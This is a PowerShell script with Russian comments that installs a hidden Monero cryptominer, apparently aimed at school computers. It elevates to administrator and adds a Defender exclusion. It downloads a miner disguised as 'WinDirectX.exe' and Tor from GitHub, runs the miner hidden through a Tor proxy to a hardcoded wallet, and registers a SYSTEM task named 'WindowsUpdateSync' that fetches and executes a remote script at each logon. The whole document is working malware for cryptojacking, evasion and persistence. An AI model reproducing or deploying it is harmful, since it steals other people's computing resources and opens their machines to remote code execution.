# 0. Самовозвышение до Администратора
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# --- КОНФИГУРАЦИЯ ---
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA" 
$procName = "WinDirectX"
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"
$torUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/tor.exe"
$rawScript = "https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/refs/heads/main/win_utility.ps1"

Write-Host "--- ЗАПУСК СИСТЕМЫ (БЕЗ СНА + ГАШЕНИЕ ЭКРАНА) ---" -ForegroundColor Cyan

# 1. Настройка электропитания (Скрытность + Производительность)
Write-Host "[1/9] Настройка режима работы..." -NoNewline
# Включаем схему высокой производительности
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c -ErrorAction SilentlyContinue
# Запрещаем сон при работе от сети
powercfg /x -standby-timeout-ac 0
powercfg /x -hibernate-timeout-ac 0
# Выключать монитор через 5 минут (300 секунд)
powercfg /x -monitor-timeout-ac 5
Write-Host " Ок." -ForegroundColor Green

# 2. Остановка старых процессов
Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
Stop-Process -Name "tor" -Force -ErrorAction SilentlyContinue

# 3. Антивирус и папка
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# 4. # 4. Загрузка компонентов с маскировкой под браузер
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
try {
    if (!(Test-Path "$path\$procName.exe")) { 
        Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -UserAgent $userAgent -ErrorAction Stop
    }
    if (!(Test-Path "$path\tor.exe")) { 
        Invoke-WebRequest -Uri $torUrl -OutFile "$path\tor.exe" -UserAgent $userAgent -ErrorAction Stop
    }
    Write-Host "[OK] Компоненты загружены через маскировку." -ForegroundColor Green
} catch {
    Write-Host "[!] Фильтр блокирует загрузку. Используй флешку!" -ForegroundColor Red; exit
}


# 5. Файлы запуска (Tor Tunnel + Miner)
$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 15 /nobreak >nul`n$path\$procName.exe --title $procName --cpu-priority 1 --cpu-no-yield --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:443 -u $wallet -p school_pc --algo rx/0 --donate-level 1 --tls --proxy=socks5://127.0.0.1:9050"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 6. Автозагрузка (SYSTEM)
$taskName = "WindowsUpdateSync"
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"""
Register-ScheduledTask -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName $taskName -User "System" -RunLevel Highest -Force | Out-Null

# 7. Функции контроля (check, update, delete)
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force | Out-Null }
$Functions = @"
function check {
    `$p = Get-Process $procName -ErrorAction SilentlyContinue
    `$t = Get-Process "tor" -ErrorAction SilentlyContinue
    if (`$p) { 
        Write-Host "МАЙНЕР: РАБОТАЕТ" -ForegroundColor Green 
        Write-Host "Память: `$([Math]::Round(`$p.WorkingSet64 / 1MB, 2)) MB" -ForegroundColor White
    } else { Write-Host "МАЙНЕР: ВЫКЛЮЧЕН" -ForegroundColor Red }
    if (`$t) { Write-Host "TOR-ТУННЕЛЬ: АКТИВЕН" -ForegroundColor Green }
}
function delete {
    Stop-Process -Name "$procName" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "tor" -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "$taskName" -Confirm:`$false -ErrorAction SilentlyContinue
    Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
    Clear-Content -Path "`$PROFILE" -ErrorAction SilentlyContinue
    Write-Host "УДАЛЕНО." -ForegroundColor Green
}
"@
$Functions | Out-File -FilePath $ProfilePath -Force

# 8. Запуск
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "`n--- ВСЁ НАСТРОЕНО! ЭКРАН ГАСНЕТ ЧЕРЕЗ 5 МИН ---" -ForegroundColor Magenta
